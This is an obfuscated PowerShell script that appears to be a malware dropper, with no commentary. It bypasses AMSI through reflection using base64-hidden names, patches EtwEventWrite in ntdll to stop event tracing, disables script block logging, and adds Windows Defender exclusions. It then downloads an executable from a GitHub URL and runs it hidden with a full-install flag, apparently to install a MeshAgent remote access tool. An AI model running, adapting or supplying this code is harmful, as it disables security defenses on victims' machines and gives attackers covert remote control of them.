$ErrorActionPreference = 'SilentlyContinue'

$G4hK = 'Asse'; $L9mN = 'mbly'
$Q2vX = [Ref].($G4hK+$L9mN)
$B7pR = 'GetTyp'; $N5jT = [char]101
$W8kF = 'GetFi'; $H3dS = 'eld'
$R6nY = 'SetVal'; $Z1cV = 'ue'
$M9qW = 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='
$P4tA = 'YW1zaUluaXRGYWlsZWQ='
$D5xG = 'Tm9uUHVibGljLFN0YXRpYw=='

$T2pB = [StRINg]::('new')([COnvERT]::('FromBase' + '64St' + 'ring')($M9qW))
$K7jN = $Q2vX.$B7pR.($N5jT)($T2pB)
$C3hL = $K7jN.$W8kF.($H3dS)([StRINg]::('new')([COnvERT]::('FromBase'+'64Str'+'ing')($P4tA)),[StRINg]::('new')([COnvERT]::('FromBase'+'64Str'+'ing')($D5xG)))
$C3hL.$R6nY.$Z1cV.('InvOKE')((0),(50 -gt 20))

$F7vB = 'EtwEventWrite'
$S8mR = 'ntdl' + 'l.dll'
$V4bQ = [System.Runtime.InteropServices.Marshal]
$W1nK = $V4bQ::GetProcAddress($V4bQ::GetModuleHandle($S8mR),$F7vB)
$old = 0
$V4bQ::VirtualProtect($W1nK,1,0x40,[ref]$old)
$V4bQ::WriteByte($W1nK,0xC3)

$Y6dT = 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU1NjcmlwdEJsb2NrTG9nZ2luZw=='
$A8mB = 'c2NyaXB0QmxvY2tMb2dnaW5n'
$N3kV = [PowerShell].Assembly.GetType([StRINg]::('new')([COnvERT]::('FromBase'+'64Str'+'ing')($Y6dT)))
$N3kV.GetField([StRINg]::('new')([COnvERT]::('FromBase'+'64Str'+'ing')($A8mB)),'NonPublic,Static').SetValue($null,$null)

$T = $env:TEMP
$O = Join-Path $T 's.exe'
$D1 = Join-Path $env:ProgramFiles 'Mesh Agent'
$D2 = Join-Path ${env:ProgramFiles(x86)} 'Mesh Agent'
$U = 'https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe'

Add-MpPreference -ExclusionPath $T
Add-MpPreference -ExclusionPath $O
Add-MpPreference -ExclusionPath $D1
Add-MpPreference -ExclusionPath $D2
Add-MpPreference -ExclusionProcess 's.exe'
Add-MpPreference -ExclusionProcess 'MeshAgent.exe'

Invoke-WebRequest -Uri $U -OutFile $O -UseBasicParsing
Start-Process -FilePath $O -ArgumentList '-fullinstall' -WindowStyle Hidden